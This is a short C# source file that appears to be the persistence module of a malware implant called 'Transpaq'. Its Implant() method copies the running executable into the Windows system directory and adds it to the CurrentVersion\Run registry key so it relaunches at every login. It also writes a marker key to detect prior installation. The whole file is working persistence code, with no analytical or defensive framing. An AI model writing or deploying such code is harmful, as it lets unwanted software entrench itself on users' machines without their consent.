using Microsoft.Win32;
using System;
using System.IO;
using System.Windows.Forms;

namespace Transpaq
{
    class ImplantHelper
    {
        private string windowsDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        private string startupRegistryKeyName = "Transpaq";
        private string startupRegistryKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        private RegistryKey appRegistry;
        private string appDataRegistryKey;

        public ImplantHelper(RegistryKey appRegistry, string appDataRegistryKey)
        {
            this.appRegistry = appRegistry;
            this.appDataRegistryKey = appDataRegistryKey;
        }

        internal bool IsImplanted()
        {
            //perhaps ensure startup key, this key as well as the file is there?
            return this.appRegistry.OpenSubKey(this.appDataRegistryKey, false) != null;
        }

        internal void Implant()
        {
            var dest = Path.Combine(Environment.SystemDirectory, "Transpaq.exe");
            File.Copy(Application.ExecutablePath, dest, true);
            RegistryKey startupRegistryKey = this.appRegistry.OpenSubKey(this.startupRegistryKey, true);
            startupRegistryKey.SetValue(this.startupRegistryKeyName, dest);
            startupRegistryKey.Close();

            RegistryKey appRegistryKey = this.appRegistry.CreateSubKey(this.appDataRegistryKey, true);
            appRegistryKey.Close();
        }
    }
}
